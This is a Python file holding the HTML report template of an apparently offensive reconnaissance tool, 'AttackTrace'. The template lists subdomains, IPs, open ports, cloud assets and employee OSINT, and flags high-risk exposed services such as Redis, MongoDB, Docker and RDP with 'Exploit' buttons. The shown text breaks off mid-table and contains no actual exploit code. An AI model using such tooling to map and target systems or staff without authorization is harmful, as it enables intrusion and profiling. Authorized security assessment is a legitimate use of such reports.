"""
Professional HTML report template for AttackTrace.
Modern dark theme with interactive elements.
"""

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AttackTrace Report - {{ target }}</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-base: #0f1117;
            --bg-surface: #151921;
            --bg-elevated: #1c2230;
            --bg-overlay: #232b3b;
            --bg-hover: rgba(255, 255, 255, 0.04);

            --accent-primary: #6366f1;
            --accent-primary-hover: #818cf8;
            --accent-primary-muted: rgba(99, 102, 241, 0.15);
            --accent-secondary: #22d3ee;
            --accent-tertiary: #a78bfa;

            --color-success: #34d399;
            --color-success-muted: rgba(52, 211, 153, 0.15);
            --color-warning: #fbbf24;
            --color-warning-muted: rgba(251, 191, 36, 0.15);
            --color-danger: #f87171;
            --color-danger-muted: rgba(248, 113, 113, 0.15);
            --color-info: #60a5fa;
            --color-info-muted: rgba(96, 165, 250, 0.15);

            --text-primary: #f1f5f9;
            --text-secondary: #94a3b8;
            --text-tertiary: #64748b;
            --text-muted: #475569;

            --border-subtle: rgba(255, 255, 255, 0.06);
            --border-default: rgba(255, 255, 255, 0.1);
            --border-strong: rgba(255, 255, 255, 0.15);

            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.25);
            --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.3);

            --radius-sm: 6px;
            --radius-md: 8px;
            --radius-lg: 12px;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--bg-base);
            color: var(--text-primary);
            line-height: 1.6;
            font-size: 14px;
            -webkit-font-smoothing: antialiased;
        }

        /* Sidebar */
        .sidebar {
            position: fixed;
            left: 0;
            top: 0;
            bottom: 0;
            width: 260px;
            background: var(--bg-surface);
            border-right: 1px solid var(--border-subtle);
            display: flex;
            flex-direction: column;
            z-index: 100;
            overflow-y: auto;
        }

        .sidebar-header {
            padding: 20px;
            border-bottom: 1px solid var(--border-subtle);
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 12px;
        }

        .logo-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-tertiary));
            border-radius: var(--radius-md);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 700;
            color: white;
        }

        .logo-text {
            font-size: 20px;
            font-weight: 700;
        }

        .target-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: var(--accent-primary-muted);
            color: var(--accent-primary-hover);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .target-badge::before {
            content: '';
            width: 6px;
            height: 6px;
            background: var(--accent-primary);
            border-radius: 50%;
        }

        .nav-section {
            padding: 16px 12px;
        }

        .nav-title {
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-muted);
            padding: 0 8px;
            margin-bottom: 8px;
        }

        .nav-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 12px;
            border-radius: var(--radius-md);
            color: var(--text-secondary);
            text-decoration: none;
            cursor: pointer;
            transition: all 0.15s ease;
        }

        .nav-item:hover {
            background: var(--bg-hover);
            color: var(--text-primary);
        }

        .nav-item.active {
            background: var(--accent-primary-muted);
            color: var(--accent-primary-hover);
        }

        .nav-icon { font-size: 18px; }

        .nav-count {
            margin-left: auto;
            background: var(--bg-elevated);
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 12px;
            font-weight: 500;
        }

        /* Main content */
        .main-content {
            margin-left: 260px;
            min-height: 100vh;
        }

        .header {
            background: var(--bg-surface);
            border-bottom: 1px solid var(--border-subtle);
            padding: 16px 24px;
            position: sticky;
            top: 0;
            z-index: 50;
        }

        .header-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .header h1 {
            font-size: 18px;
            font-weight: 600;
        }

        .header-meta {
            display: flex;
            align-items: center;
            gap: 16px;
            color: var(--text-tertiary);
            font-size: 13px;
        }

        .page-content {
            padding: 24px;
            max-width: 1400px;
        }

        /* Metrics Grid */
        .metrics-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }

        .metric-card {
            background: var(--bg-surface);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-lg);
            padding: 20px;
            transition: all 0.15s ease;
        }

        .metric-card:hover {
            border-color: var(--border-default);
            box-shadow: var(--shadow-md);
        }

        .metric-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 12px;
        }

        .metric-icon {
            width: 40px;
            height: 40px;
            border-radius: var(--radius-md);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }

        .metric-icon.domains { background: var(--accent-primary-muted); color: var(--accent-primary); }
        .metric-icon.ips { background: var(--color-info-muted); color: var(--color-info); }
        .metric-icon.ports { background: var(--color-success-muted); color: var(--color-success); }
        .metric-icon.webapps { background: var(--accent-primary-muted); color: var(--accent-tertiary); }
        .metric-icon.critical { background: var(--color-danger-muted); color: var(--color-danger); }
        .metric-icon.high { background: var(--color-warning-muted); color: var(--color-warning); }
        .metric-icon.medium { background: var(--color-info-muted); color: var(--color-info); }
        .metric-icon.cloud { background: var(--color-success-muted); color: var(--color-success); }

        .metric-value {
            font-size: 32px;
            font-weight: 700;
            line-height: 1;
            margin-bottom: 4px;
        }

        .metric-label {
            font-size: 13px;
            color: var(--text-tertiary);
        }

        /* Section Card */
        .section-card {
            background: var(--bg-surface);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-lg);
            margin-bottom: 20px;
            overflow: hidden;
        }

        .section-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 20px;
            background: var(--bg-elevated);
            border-bottom: 1px solid var(--border-subtle);
            cursor: pointer;
            user-select: none;
        }

        .section-header:hover {
            background: var(--bg-overlay);
        }

        .section-title {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 15px;
            font-weight: 600;
        }

        .section-icon {
            width: 32px;
            height: 32px;
            border-radius: var(--radius-sm);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
        }

        .section-icon.subdomains { background: var(--accent-primary-muted); }
        .section-icon.ips { background: var(--color-info-muted); }
        .section-icon.webapps { background: var(--color-success-muted); }
        .section-icon.findings { background: var(--color-danger-muted); }
        .section-icon.cloud { background: var(--color-warning-muted); }
        .section-icon.tech { background: var(--accent-primary-muted); }

        .section-badge {
            font-size: 12px;
            font-weight: 500;
            padding: 4px 12px;
            background: var(--bg-surface);
            border-radius: 10px;
            color: var(--text-secondary);
        }

        .section-content {
            padding: 20px;
        }

        .section-content.collapsed {
            display: none;
        }

        /* Data Table */
        .data-table {
            width: 100%;
            border-collapse: collapse;
        }

        .data-table th {
            text-align: left;
            padding: 12px 16px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            color: var(--text-muted);
            background: var(--bg-elevated);
            border-bottom: 1px solid var(--border-subtle);
        }

        .data-table td {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-subtle);
            font-size: 13px;
        }

        .data-table tr:hover {
            background: var(--bg-hover);
        }

        .data-table tr:last-child td {
            border-bottom: none;
        }

        /* Tags and Badges */
        .tag {
            display: inline-flex;
            align-items: center;
            gap: 4px;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 500;
        }

        .tag-critical { background: var(--color-danger-muted); color: var(--color-danger); }
        .tag-high { background: var(--color-warning-muted); color: var(--color-warning); }
        .tag-medium { background: var(--color-info-muted); color: var(--color-info); }
        .tag-low { background: var(--color-success-muted); color: var(--color-success); }
        .tag-info { background: var(--bg-elevated); color: var(--text-secondary); }

        .tag-tech {
            background: var(--accent-primary-muted);
            color: var(--accent-primary-hover);
        }

        .tag-alive {
            background: var(--color-success-muted);
            color: var(--color-success);
        }

        .tag-dead {
            background: var(--bg-elevated);
            color: var(--text-muted);
        }

        /* Finding Card */
        .finding-card {
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-md);
            padding: 16px;
            margin-bottom: 12px;
        }

        .finding-card:last-child {
            margin-bottom: 0;
        }

        .finding-header {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            margin-bottom: 8px;
        }

        .finding-severity {
            padding: 4px 10px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .finding-severity.critical { background: var(--color-danger-muted); color: var(--color-danger); }
        .finding-severity.high { background: var(--color-warning-muted); color: var(--color-warning); }
        .finding-severity.medium { background: var(--color-info-muted); color: var(--color-info); }
        .finding-severity.low { background: var(--color-success-muted); color: var(--color-success); }
        .finding-severity.info { background: var(--bg-overlay); color: var(--text-secondary); }

        .finding-title {
            font-weight: 600;
            font-size: 14px;
        }

        .finding-description {
            color: var(--text-secondary);
            font-size: 13px;
            line-height: 1.6;
        }

        .finding-meta {
            display: flex;
            gap: 16px;
            margin-top: 12px;
            padding-top: 12px;
            border-top: 1px solid var(--border-subtle);
            font-size: 12px;
            color: var(--text-tertiary);
        }

        /* Grid layouts */
        .grid-2 {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
        }

        /* Search */
        .search-box {
            position: relative;
            margin-bottom: 16px;
        }

        .search-input {
            width: 100%;
            padding: 10px 16px;
            padding-left: 40px;
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-md);
            color: var(--text-primary);
            font-size: 13px;
            font-family: inherit;
        }

        .search-input:focus {
            outline: none;
            border-color: var(--accent-primary);
        }

        .search-icon {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-muted);
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-base);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--bg-overlay);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-muted);
        }

        /* Code/mono */
        .mono {
            font-family: 'SF Mono', 'Consolas', monospace;
            font-size: 12px;
        }

        /* Tech stack */
        .tech-grid {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
        }

        /* Empty state */
        .empty-state {
            text-align: center;
            padding: 40px;
            color: var(--text-tertiary);
        }

        .empty-state-icon {
            font-size: 48px;
            margin-bottom: 16px;
            opacity: 0.5;
        }

        /* Screenshot Gallery */
        .screenshot-gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }

        .screenshot-card {
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-lg);
            overflow: hidden;
            transition: all 0.2s ease;
        }

        .screenshot-card:hover {
            border-color: var(--accent-primary);
            box-shadow: var(--shadow-lg);
            transform: translateY(-2px);
        }

        .screenshot-image {
            height: 180px;
            background: var(--bg-base);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .screenshot-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            cursor: pointer;
            transition: transform 0.2s ease;
        }

        .screenshot-image img:hover {
            transform: scale(1.05);
        }

        .no-screenshot {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            color: var(--text-muted);
            font-size: 14px;
        }

        .no-screenshot span:first-child {
            font-size: 32px;
            opacity: 0.5;
        }

        .screenshot-info {
            padding: 16px;
        }

        .screenshot-url {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 8px;
        }

        .screenshot-url a {
            color: var(--accent-primary);
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .screenshot-url a:hover {
            color: var(--accent-primary-hover);
        }

        .screenshot-title {
            color: var(--text-secondary);
            font-size: 13px;
            margin-bottom: 12px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .screenshot-techs {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }

        .table-thumbnail {
            width: 80px;
            height: 50px;
            object-fit: cover;
            border-radius: var(--radius-sm);
            cursor: pointer;
            transition: transform 0.2s ease;
        }

        .table-thumbnail:hover {
            transform: scale(1.1);
        }

        /* View toggle */
        .view-toggle {
            display: flex;
            gap: 8px;
        }

        .view-btn {
            padding: 8px 16px;
            background: var(--bg-elevated);
            border: 1px solid var(--border-subtle);
            border-radius: var(--radius-md);
            color: var(--text-secondary);
            font-size: 13px;
            cursor: pointer;
            transition: all 0.15s ease;
        }

        .view-btn:hover {
            background: var(--bg-overlay);
            color: var(--text-primary);
        }

        .view-btn.active {
            background: var(--accent-primary-muted);
            border-color: var(--accent-primary);
            color: var(--accent-primary-hover);
        }

        .hidden {
            display: none !important;
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(4px);
        }

        .modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            max-width: 90%;
            max-height: 90%;
            position: relative;
        }

        .modal-content img {
            max-width: 100%;
            max-height: 85vh;
            border-radius: var(--radius-lg);
            box-shadow: var(--shadow-lg);
        }

        .modal-url {
            text-align: center;
            margin-top: 16px;
            color: var(--text-secondary);
            font-size: 14px;
        }

        .modal-url a {
            color: var(--accent-primary);
        }

        .modal-close {
            position: absolute;
            top: -40px;
            right: 0;
            font-size: 32px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: color 0.15s ease;
        }

        .modal-close:hover {
            color: var(--text-primary);
        }

        @media (max-width: 1200px) {
            .grid-2 { grid-template-columns: 1fr; }
            .screenshot-gallery { grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); }
        }

        @media (max-width: 768px) {
            .sidebar { display: none; }
            .main-content { margin-left: 0; }
            .metrics-grid { grid-template-columns: repeat(2, 1fr); }
            .screenshot-gallery { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <!-- Sidebar -->
    <nav class="sidebar">
        <div class="sidebar-header">
            <div class="logo">
                <div class="logo-icon">E</div>
                <div class="logo-text">AttackTrace</div>
            </div>
            <div class="target-badge">{{ target }}</div>
        </div>

        <div class="nav-section">
            <div class="nav-title">Overview</div>
            <a href="#overview" class="nav-item active">
                <span class="nav-icon">📊</span>
                <span>Dashboard</span>
            </a>
        </div>

        <div class="nav-section">
            <div class="nav-title">Discovery</div>
            <a href="#subdomains" class="nav-item">
                <span class="nav-icon">🌐</span>
                <span>Subdomains</span>
                <span class="nav-count">{{ stats.subdomains }}</span>
            </a>
            <a href="#ips" class="nav-item">
                <span class="nav-icon">🖥️</span>
                <span>IP Addresses</span>
                <span class="nav-count">{{ stats.ips }}</span>
            </a>
            <a href="#ports" class="nav-item">
                <span class="nav-icon">🔌</span>
                <span>Open Ports</span>
                <span class="nav-count">{{ stats.ports }}</span>
            </a>
            <a href="#webapps" class="nav-item">
                <span class="nav-icon">🔗</span>
                <span>Web Apps</span>
                <span class="nav-count">{{ stats.webapps }}</span>
            </a>
            <a href="#webapps" class="nav-item">
                <span class="nav-icon">📷</span>
                <span>Screenshots</span>
                <span class="nav-count">{{ stats.screenshots }}</span>
            </a>
            <a href="#cloud" class="nav-item">
                <span class="nav-icon">☁️</span>
                <span>Cloud Assets</span>
                <span class="nav-count">{{ stats.cloud }}</span>
            </a>
        </div>

        <div class="nav-section">
            <div class="nav-title">OSINT</div>
            <a href="#github" class="nav-item">
                <span class="nav-icon">🐙</span>
                <span>GitHub Intel</span>
                <span class="nav-count">{{ github_repos|length if github_repos else 0 }}</span>
            </a>
            <a href="#employees" class="nav-item">
                <span class="nav-icon">👤</span>
                <span>Employees</span>
                <span class="nav-count">{{ employees|length if employees else 0 }}</span>
            </a>
        </div>

        <div class="nav-section">
            <div class="nav-title">Analysis</div>
            <a href="#findings" class="nav-item">
                <span class="nav-icon">⚠️</span>
                <span>Findings</span>
                <span class="nav-count">{{ stats.findings }}</span>
            </a>
            <a href="#technologies" class="nav-item">
                <span class="nav-icon">⚙️</span>
                <span>Technologies</span>
            </a>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="main-content">
        <header class="header">
            <div class="header-content">
                <h1>Attack Surface Report</h1>
                <div class="header-meta">
                    <span>Session: {{ session_id }}</span>
                    <span>Generated: {{ generated_at }}</span>
                </div>
            </div>
        </header>

        <div class="page-content">
            <!-- Metrics -->
            <section id="overview">
                <div class="metrics-grid">
                    <div class="metric-card">
                        <div class="metric-header">
                            <div class="metric-icon domains">🌐</div>
                        </div>
                        <div class="metric-value">{{ stats.subdomains }}</div>
                        <div class="metric-label">Subdomains</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-header">
                            <div class="metric-icon ips">🖥️</div>
                        </div>
                        <div class="metric-value">{{ stats.ips }}</div>
                        <div class="metric-label">IP Addresses</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-header">
                            <div class="metric-icon ports">🔌</div>
                        </div>
                        <div class="metric-value">{{ stats.ports }}</div>
                        <div class="metric-label">Open Ports</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-header">
                            <div class="metric-icon webapps">🔗</div>
                        </div>
                        <div class="metric-value">{{ stats.webapps }}</div>
                        <div class="metric-label">Web Applications</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-header">
                            <div class="metric-icon critical">🔴</div>
                        </div>
                        <div class="metric-value">{{ stats.critical }}</div>
                        <div class="metric-label">Critical Findings</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-header">
                            <div class="metric-icon high">🟠</div>
                        </div>
                        <div class="metric-value">{{ stats.high }}</div>
                        <div class="metric-label">High Findings</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-header">
                            <div class="metric-icon medium">🟡</div>
                        </div>
                        <div class="metric-value">{{ stats.medium }}</div>
                        <div class="metric-label">Medium Findings</div>
                    </div>
                    <div class="metric-card">
                        <div class="metric-header">
                            <div class="metric-icon cloud">☁️</div>
                        </div>
                        <div class="metric-value">{{ stats.cloud }}</div>
                        <div class="metric-label">Cloud Assets</div>
                    </div>
                </div>
            </section>

            <!-- Findings -->
            <section id="findings" class="section-card">
                <div class="section-header" onclick="toggleSection(this)">
                    <div class="section-title">
                        <div class="section-icon findings">⚠️</div>
                        <span>Security Findings</span>
                    </div>
                    <div class="section-badge">{{ findings|length }} findings</div>
                </div>
                <div class="section-content">
                    {% if findings %}
                    {% for finding in findings %}
                    <div class="finding-card">
                        <div class="finding-header">
                            <span class="finding-severity {{ finding.severity.value }}">{{ finding.severity.value }}</span>
                            <span class="finding-title">{{ finding.title }}</span>
                        </div>
                        <div class="finding-description">{{ finding.description }}</div>
                        {% if finding.affected_asset %}
                        <div class="finding-meta">
                            <span>Asset: <span class="mono">{{ finding.affected_asset }}</span></span>
                            <span>Category: {{ finding.category }}</span>
                        </div>
                        {% endif %}
                    </div>
                    {% endfor %}
                    {% else %}
                    <div class="empty-state">
                        <div class="empty-state-icon">✅</div>
                        <div>No security findings detected</div>
                    </div>
                    {% endif %}
                </div>
            </section>

            <!-- Subdomains -->
            <section id="subdomains" class="section-card">
                <div class="section-header" onclick="toggleSection(this)">
                    <div class="section-title">
                        <div class="section-icon subdomains">🌐</div>
                        <span>Subdomains</span>
                    </div>
                    <div class="section-badge">{{ subdomains|length }} found ({{ subdomains|selectattr('is_alive')|list|length }} active)</div>
                </div>
                <div class="section-content">
                    <div class="search-box">
                        <span class="search-icon">🔍</span>
                        <input type="text" class="search-input" placeholder="Search subdomains..." onkeyup="filterTable(this, 'subdomains-table')">
                    </div>
                    <div class="subdomain-filters" style="margin-bottom: 16px;">
                        <button class="view-btn active" onclick="filterSubdomains('all', this)">All ({{ subdomains|length }})</button>
                        <button class="view-btn" onclick="filterSubdomains('alive', this)">Active ({{ subdomains|selectattr('is_alive')|list|length }})</button>
                        <button class="view-btn" onclick="filterSubdomains('dead', this)">Inactive ({{ subdomains|rejectattr('is_alive')|list|length }})</button>
                    </div>
                    <table class="data-table" id="subdomains-table">
                        <thead>
                            <tr>
                                <th>Subdomain</th>
                                <th>IP Addresses</th>
                                <th>DNS Status</th>
                                <th>HTTP</th>
                                <th>Source</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for sub in subdomains %}
                            <tr data-alive="{{ 'true' if sub.is_alive else 'false' }}">
                                <td class="mono">
                                    {% if sub.is_alive %}
                                    <a href="https://{{ sub.fqdn }}" target="_blank" style="color: var(--accent-primary);">{{ sub.fqdn }}</a>
                                    {% else %}
                                    {{ sub.fqdn }}
                                    {% endif %}
                                </td>
                                <td class="mono">{{ sub.resolved_ips|join(', ') or '-' }}</td>
                                <td>
                                    {% if sub.resolved_ips %}
                                    <span class="tag tag-alive">Resolves</span>
                                    {% else %}
                                    <span class="tag tag-dead">No DNS</span>
                                    {% endif %}
                                </td>
                                <td>
                                    {% set webapp_match = webapps|selectattr('host', 'equalto', sub.fqdn)|first %}
                                    {% if webapp_match %}
                                    <span class="tag tag-alive">{{ webapp_match.status_code }}</span>
                                    {% elif sub.is_alive %}
                                    <span class="tag tag-info">DNS Only</span>
                                    {% else %}
                                    <span class="tag tag-dead">—</span>
                                    {% endif %}
                                </td>
                                <td><span class="tag tag-info">{{ sub.source }}</span></td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </section>

            <!-- IP Addresses -->
            <section id="ips" class="section-card">
                <div class="section-header" onclick="toggleSection(this)">
                    <div class="section-title">
                        <div class="section-icon ips">🖥️</div>
                        <span>IP Addresses & Services</span>
                    </div>
                    <div class="section-badge">{{ ips|length }} hosts, {{ stats.ports }} ports</div>
                </div>
                <div class="section-content">
                    <div class="search-box">
                        <span class="search-icon">🔍</span>
                        <input type="text" class="search-input" placeholder="Search IPs, services, ports..." onkeyup="filterTable(this, 'ips-table')">
                    </div>
                    <table class="data-table" id="ips-table">
                        <thead>
                            <tr>
                                <th>IP Address</th>
                                <th>Organization / ASN</th>
                                <th>Location</th>
                                <th>Cloud</th>
                                <th>Services</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for ip in ips %}
                            <tr>
                                <td>
                                    <div class="mono" style="font-weight: 600;">{{ ip.address }}</div>
                                    {% if ip.hostnames %}
                                    <div style="font-size: 11px; color: var(--text-tertiary); margin-top: 4px;">
                                        {{ ip.hostnames[:2]|join(', ') }}{% if ip.hostnames|length > 2 %} +{{ ip.hostnames|length - 2 }}{% endif %}
                                    </div>
                                    {% endif %}
                                </td>
                                <td>
                                    <div>{{ ip.asn_org or '-' }}</div>
                                    {% if ip.asn %}
                                    <div style="font-size: 11px; color: var(--text-tertiary);">AS{{ ip.asn }}</div>
                                    {% endif %}
                                </td>
                                <td>
                                    {% if ip.geolocation and ip.geolocation.country %}
                                    <div>{{ ip.geolocation.city }}{% if ip.geolocation.city and ip.geolocation.country %}, {% endif %}{{ ip.geolocation.country_code or ip.geolocation.country }}</div>
                                    {% else %}
                                    -
                                    {% endif %}
                                </td>
                                <td>
                                    {% if ip.cloud_provider %}
                                    <span class="tag tag-tech">{{ ip.cloud_provider.value|upper }}</span>
                                    {% if ip.cloud_region %}
                                    <div style="font-size: 10px; color: var(--text-tertiary); margin-top: 2px;">{{ ip.cloud_region }}</div>
                                    {% endif %}
                                    {% else %}
                                    -
                                    {% endif %}
                                </td>
                                <td style="max-width: 400px;">
                                    {% if ip.ports %}
                                    <div class="services-list">
                                        {% for port in ip.ports[:8] %}
                                        <div class="service-item" style="display: flex; align-items: center; gap: 8px; padding: 4px 0; border-bottom: 1px solid var(--border-subtle);">
                                            <span class="tag {% if port.number in [22, 80, 443] %}tag-info{% elif port.number in [21, 23, 3389, 5900] %}tag-high{% elif port.number in [27017, 6379, 9200, 3306, 5432, 445, 2375] %}tag-critical{% else %}tag-alive{% endif %}" style="min-width: 55px; text-align: center;">{{ port.number }}/{{ port.protocol }}</span>
                                            <div style="flex: 1; min-width: 0;">
                                                <span style="font-weight: 500;">{{ port.service.name or 'unknown' }}</span>
                                                {% if port.service.product %}
                                                <span style="color: var(--text-secondary);"> - {{ port.service.product }}{% if port.service.version %} {{ port.service.version }}{% endif %}</span>
                                                {% endif %}
                                                {% if port.service.banner %}
                                                <div style="font-size: 10px; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 300px;" title="{{ port.service.banner }}">{{ port.service.banner[:80] }}</div>
                                                {% endif %}
                                            </div>
                                        </div>
                                        {% endfor %}
                                        {% if ip.ports|length > 8 %}
                                        <div style="padding: 4px 0; color: var(--text-muted); font-size: 12px;">+ {{ ip.ports|length - 8 }} more services</div>
                                        {% endif %}
                                    </div>
                                    {% else %}
                                    <span class="tag tag-dead">No open ports</span>
                                    {% endif %}
                                </td>
                            </tr>
                            {% endfor %}
                        </tbody>
                    </table>
                </div>
            </section>

            <!-- Open Ports Summary -->
            <section id="ports" class="section-card">
                <div class="section-header" onclick="toggleSection(this)">
                    <div class="section-title">
                        <div class="section-icon ports" style="background: var(--color-success-muted);">🔌</div>
                        <span>Open Ports & Exploitation Guide</span>
                    </div>
                    <div class="section-badge">{{ stats.ports }} ports across {{ ips|length }} hosts</div>
                </div>
                <div class="section-content">
                    {% set has_ports = [] %}
                    {% for ip in ips %}{% if ip.ports %}{% set _ = has_ports.append(1) %}{% endif %}{% endfor %}

                    {% if has_ports %}
                    <!-- High-Risk Ports Alert -->
                    <div style="margin-bottom: 20px; padding: 16px; background: var(--color-danger-muted); border-radius: var(--radius-md); border: 1px solid rgba(248, 113, 113, 0.3);">
                        <h4 style="color: var(--color-danger); margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
                            <span>⚠️</span> High-Risk Services - Click for Exploitation Details
                        </h4>
                        <table class="data-table" style="background: transparent;">
                            <thead>
                                <tr>
                                    <th>IP Address</th>
                                    <th>Port</th>
                                    <th>Service</th>
                                    <th>Product</th>
                                    <th>Risk Category</th>
                                    <th>Exploit Guide</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for ip in ips %}
                                {% for port in ip.ports %}
                                {% if port.number in [21, 23, 445, 3389, 5900, 27017, 6379, 9200, 3306, 5432, 2375, 2376, 6443, 2379, 5984, 11211, 1433, 8080, 9000] %}
                                <tr>
                                    <td class="mono">{{ ip.address }}</td>
                                    <td><span class="tag tag-critical">{{ port.number }}/{{ port.protocol }}</span></td>
                                    <td>{{ port.service.name or 'unknown' }}</td>
                                    <td>{{ port.service.product or '-' }} {{ port.service.version or '' }}</td>
                                    <td>
                                        {% if port.number == 27017 %}Database (MongoDB)
                                        {% elif port.number == 6379 %}Database (Redis)
                                        {% elif port.number == 9200 %}Database (Elasticsearch)
                                        {% elif port.number == 3306 %}Database (MySQL)
                                        {% elif port.number == 5432 %}Database (PostgreSQL)
                                        {% elif port.number == 1433 %}Database (MSSQL)
                                        {% elif port.number == 445 %}File Share (SMB)
                                        {% elif port.number == 3389 %}Remote Access (RDP)
                                        {% elif port.number == 5900 %}Remote Access (VNC)
                                        {% elif port.number == 21 %}Cleartext (FTP)
                                        {% elif port.number == 23 %}Cleartext (Telnet)
                                        {% elif port.number in [2375, 2376] %}Container (Docker)
                                        {% elif port.number == 6443 %}Container (Kubernetes)
                                        {% elif port.number == 2379 %}Container (etcd)
                                        {% elif port.number == 8080 %}CI/CD (Jenkins)
                                        {% elif port.number == 9000 %}Container (Portainer)
                                        {% else %}Sensitive Service
                                        {% endif %}
                                    </td>
                                    <td><button class="view-btn" onclick="showServiceGuide({{ port.number }})">🔓 Exploit</button></td>
                                </tr>
                                {% endif %}
                                {% endfor %}
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>

                    <!-- Full Port List -->
                    <h4 style="color: var(--text-secondary); margin-bottom: 12px; font-size: 13px; text-transform: uppercase;">All Discovered Ports</h4>
                    <div class="search-box">
                        <span class="search-icon">🔍</span>
                        <input type="text" class="search-input" placeholder="Search ports, services, IPs..." onkeyup="filterTable(this, 'ports-table')">
                    </div>
                    <table class="data-table" id="ports-table">
                        <thead>
                            <tr>
                                <th>IP Address</th>
                                <th>Port</th>
                                <th>Service</th>
                                <th>Product / Version</th>
                                <th>Banner</th>
                                <th>Exploit</th>
                            </tr>
                        </thead>
                        <tbody>
                            {% for ip in ips %}
                            {% for port in ip.ports %}
                            <tr>
                                <td class="mono">{{ ip.address }}</td>
                                <td><span class="tag {% if port.number in [27017, 6379, 9200, 3306, 5432, 445, 2375, 6443, 2379] %}tag-critical{% elif port.number in [21, 23, 3389, 5900, 2376, 11211, 1433] %}tag-high{% elif port.number in [22, 80, 443] %}tag-alive{% else %}tag-info{% endif %}">{{ port.number }}/{{ port.protocol }}</span></td>
                                <td>{{ port.service.name or 'unknown' }}</td>
                                <td>{{ port.service.product or '-' }}{% if port.service.version %} <span style="color: var(--text-tertiary);">{{ port.service.version }}</span>{% endif %}</td>
                                <td style="max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 11px; color: var(--text-muted);" title="{{ port.service.banner }}">{{ port.service.banner[:100] if port.service.banner else '-' }}</td>
                                <td>
